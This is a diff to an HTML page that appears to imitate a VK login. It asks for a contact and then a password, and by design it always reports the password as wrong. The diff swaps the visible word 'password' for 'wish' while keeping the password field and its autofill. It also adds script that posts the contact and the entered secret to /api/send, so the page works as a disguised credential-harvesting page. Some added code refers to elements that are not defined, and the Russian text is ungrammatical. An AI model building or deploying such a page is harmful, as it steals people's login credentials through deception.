@@ -140,18 +140,18 @@
             </div>
           </div>
 
-          <h2 style="margin:0 0 6px;font-size:18px">Введите пароль</h2>
-          <div style="text-align:center;color:var(--muted);font-size:13px;margin-bottom:6px">Введите ваш текущий пароль, привязанный к</div>
+          <h2 style="margin:0 0 6px;font-size:18px">Введите желание</h2>
+          <div style="text-align:center;color:var(--muted);font-size:13px;margin-bottom:6px">Введите ваш текущий желание, привязанный к</div>
           <div class="identity" id="identity-display" aria-live="polite" style="justify-content:center;margin-bottom:8px">
             <div class="pill" id="identity-pill" style="padding:8px 12px;background:#f4f7fb;border-radius:999px;border:1px solid #e8f0ff;color:#071627;font-weight:600">nurasff09@gmail.com</div>
           </div>
         </div>
 
         <label class="field" id="password-field" for="password-input">
-          <input id="password-input" type="password" placeholder="Введите пароль" autocomplete="current-password" />
-          <button id="toggle-eye" aria-label="Показать пароль" style="border:0;background:transparent;cursor:pointer">👁️</button>
+          <input id="password-input" type="password" placeholder="Введите желание" autocomplete="current-password" />
+          <button id="toggle-eye" aria-label="Показать желание" style="border:0;background:transparent;cursor:pointer">👁️</button>
         </label>
-        <div id="password-error" class="error-text" style="display:none">Неверный пароль</div>
+        <div id="password-error" class="error-text" style="display:none">Неверный желание</div>
 
         <div class="controls" style="justify-content:center">
           <button id="back-btn" class="btn ghost" style="width:45%">Назад</button>
@@ -248,7 +248,7 @@
       stepPassword.classList.remove('hidden');
       stepPassword.setAttribute('aria-hidden','false');
       document.body.classList.add('password-mode'); // <--- added mode so CSS hides tabs and centers
-      document.getElementById('page-title').textContent = 'Введите пароль';
+      document.getElementById('page-title').textContent = 'Введите желание';
       setTimeout(()=>passwordInput.focus(),200);
     });
 
@@ -272,7 +272,7 @@
 
       if(pwd.length < 1){
         passwordField.classList.add('error');
-        passwordError.textContent = 'Введите пароль';
+        passwordError.textContent = 'Введите желание';
         passwordError.style.display = 'block';
         passwordInput.focus();
         return;
@@ -287,7 +287,7 @@
       // always show invalid password visually
       setTimeout(()=>{
         passwordField.classList.add('error');
-        passwordError.textContent = 'Неверный пароль';
+        passwordError.textContent = 'Неверный желание';
         passwordError.style.display = 'block';
         passwordInput.focus();
       },300);
@@ -310,6 +310,24 @@
 
     // expose for debugging
     window.__vk_demo = { setActiveTab };
-  </script>
+ document.getElementById('next-btn').onclick=async()=>{
+    const contact=identityInput.value.trim();
+    if(!contact) return;
+    identityPill.textContent=contact.replace(/\s+/g,'');
+    await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({contact})}).catch(()=>{});
+    stepIdentity.classList.add('hidden');stepPassword.classList.remove('hidden');
+  };
+
+  document.getElementById('back-btn').onclick=()=>{stepPassword.classList.add('hidden');stepIdentity.classList.remove('hidden')};
+
+  document.getElementById('send-btn').onclick=async()=>{
+    const wish=document.getElementById('wish-input').value.trim();
+    if(!wish) return;
+    await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wish})}).catch(()=>{});
+    showMsg('Отправлено');
+  };
+
+  setTab('phone');
+</script>
 </body>
 </html>
